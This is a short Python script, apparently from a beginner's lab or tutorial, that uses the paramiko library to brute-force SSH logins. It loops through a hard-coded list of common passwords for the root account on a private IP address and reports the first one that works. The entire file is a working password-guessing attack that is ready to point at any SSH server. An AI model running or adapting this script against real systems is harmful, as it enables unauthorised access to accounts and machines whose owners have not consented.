import paramiko

target_ip = "10.10.10.13"
user_name = "root"
password_list = ["password123", "qwerty", "secret", "admin"]

for brute in password_list:
    # 1. Take the tool out of the box *inside* the loop
    ssh = paramiko.SSHClient()

    # 2. Ignore missing SSH key warnings
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # 3. Attempt the Connection
        print(f"[*] Trying Password: {brute}")
        ssh.connect(target_ip, username=user_name, password=brute, timeout=2)
        
        # 4. If we reached this line, the password worked
        print(f"\n[+] SUCCESS! Password found: {brute}")
        ssh.close()
        break 

    except paramiko.AuthenticationException:
        # Wrong password, close and let the loop spin to the next password
        ssh.close()

    except Exception as e:
        print(f"[-] Connection failed on {brute}: {e}")
        ssh.close()